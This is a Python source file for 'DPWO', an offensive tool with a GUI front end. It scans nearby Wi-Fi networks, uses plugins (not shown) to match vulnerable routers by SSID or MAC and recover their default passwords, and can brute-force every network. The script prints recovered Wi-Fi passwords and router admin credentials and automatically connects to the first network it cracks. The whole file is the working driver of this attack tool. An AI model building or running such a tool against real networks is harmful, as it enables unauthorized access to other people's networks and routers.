# -*- coding: utf-8 -*-
import argparse
import importlib.machinery
import importlib.util
import os
import subprocess
import psutil
import sys

from wifi import Cell, Scheme
from gooey import Gooey, GooeyParser

'''
DPWO
Default Password Wifi Owner 0.4v
python3
'''

AIRPORT_PATH = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport"


class NETOwner():
    def __init__(self, iface, connect=False,brute = False,
                 airport=AIRPORT_PATH, verbosity=0):
        self.iface = iface
        self.brute = brute
        self.connect = connect
        self.airport = airport
        self.verbosity = verbosity
        self.os = sys.platform
        self.plugins = self.load_plugins()

    def load_plugins(self) :
        plugin_folder = "./plugins"
        plugins = []
        possible_plugins = os.listdir(plugin_folder)

        for f in possible_plugins : 
            location = os.path.join(plugin_folder,f)

            if f[-3:] != '.py' or os.path.isfile(location) != True:
                continue
            
            info = importlib.machinery.PathFinder().find_spec(f[:-3],[plugin_folder])
            p = info.loader.load_module()
            plugins.append(p)

        return plugins

    def osx_networks(self):
        scan = ""
        while scan == "":  # for some reason airport fails randomly
            scan = subprocess.check_output([self.airport, "scan"]).decode()
            # scan the area for wifi
        scan = scan.encode('ascii','ignore')
        scan = scan.decode().split("\n")

        n_spaces = scan[0].split("SSID")[0].count(" ")+4

        scan.pop(0) # remove header

        for wifi in scan:
            obj_t = str.split(wifi)
            if len(obj_t) < 1 :
                continue
            obj = [ wifi[:n_spaces].replace(" ",''), 
                    wifi[n_spaces:].split()[0] ]

            if len(obj) > 0:
                yield obj

    def linux_networks(self):
        scan = Cell.all(self.iface)
        for wifi in scan:
            obj = [wifi.ssid, wifi.address, wifi.signal, wifi.channel, wifi]
            yield obj

    def scan_network(self):
        if self.os == "linux" or self.os == "linux2":
            scanner = self.linux_networks()
        elif self.os == "darwin":
            scanner = self.osx_networks()
        # elif os == "win32": TODO

        results = []
        for wifi in scanner :

            if self.verbosity > 1:
                print(str(wifi))

            # match SSID/MAC to a plugin
            for p in self.plugins : 
                if self.brute and p.__name__ == "brute" :
                    for b in p.own(wifi[0],wifi[1]) :
                        results.append(b)
                elif p.is_vuln(wifi[0],wifi[1]) : 
                    results.append(p.own(wifi[0],wifi[1]))

        return results

    def connect_net(self, wifi):
        try:
            if self.os == "linux" or self.os == "linux2":
                status = self.connect_net_linux(wifi)
            elif self.os == "darwin":
                status = self.connect_net_osx(wifi)
            # elif os == "win32":

            return status
        except:
            return False;

    def connect_net_osx(self, wifi):
            connect = subprocess.check_output([
                "networksetup", "-setairportnetwork",
                self.iface, wifi['ssid'], wifi['wifi_password']
            ]).decode()

            if self.verbosity > 0:
                print(connect)

            return "Failed" not in connect and "Could not" not in connect

    def connect_net_linux(self, wifi):
        return Scheme.find(self.iface, wifi[1]).activate()

    def own(self):

        wifi_available = self.scan_network()

        if len(wifi_available) == 0:
            print("No WiFi available :'(")
        else:
            connected = False
            for wifi in wifi_available:
                print("WI-FI: " + wifi["ssid"])
                print("Password: " + wifi["wifi_password"])

                if self.verbosity > 0:
                    if wifi["admin_login"] and wifi["admin_password"] : 
                        print("Admin credentials of the router: ")
                        print("User: " + wifi["admin_login"])
                        print("Password: " + wifi["admin_password"])

                if not connected and self.connect:
                    print("Trying to connect...")
                    if self.connect_net(wifi):
                        print("Connected! Have fun (:")
                        if not self.brute :
                            connected = True
                    else:
                        print("Nope :(")



item_default = {
    'error_color': '#ea7878',
    'label_color': '#4af626',
    'help_color': '#4af626',
    'full_width': False,
    'validator': {
        'type': 'local',
        'test': 'lambda x: True',
        'message': ''
    },
    'external_validator': {
        'cmd': '',
    }
}

def parse_args():
    parser = GooeyParser(description="An tool to automatically discover passwords of nearby WIFI networks.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    for group in parser.parser._action_groups:
        group.gooey_options = {'label_color': '#4af626', 'description_color': '#4af6f1'}

    #get all network interfaces
    interfaces = psutil.net_if_addrs()

    

    parser.add_argument("-i", "--interface", choices=interfaces.keys(), default="en0",
                        help="Network interface.", gooey_options=item_default)
    parser.add_argument("-b", "--brute",action='store_true', default=False,
                        help="Bruteforce all networks unregarding the SSID.", gooey_options=item_default)
    parser.add_argument("-d", "--disable", action="store_false", default=True,
                        help="Disable autoconnect to the first vulnerable network.", gooey_options=item_default)
    # check if running on osx
    if sys.platform == "darwin":
        parser.add_argument("-a", "--airport", default=AIRPORT_PATH,
                        help="Airport program path.", gooey_options=item_default)
    parser.add_argument("-v", "--verbosity", action="count",
                        help="Increase output verbosity.", gooey_options=item_default)
    args = parser.parse_args()

    return args


@Gooey(dump_build_config=False,
           program_name="DPWO",
       body_bg_color='#000000',
       terminal_font_color='#4af626',
       terminal_panel_color='#000000',
           header_bg_color='#000000',
           footer_bg_color='#000000',
           sidebar_bg_color='#000000',
           )
def main():
    print("DPWO      v0.5")
    print("≈≈≈≈≈≈≈≈≈≈≈≈≈≈")

    args = parse_args()

    owner = NETOwner(
        args.interface,
        connect=args.disable,
        brute=args.brute,
        airport=args.airport,
        verbosity=args.verbosity or 0
    )


    owner.own()


if __name__ == "__main__":
    main()
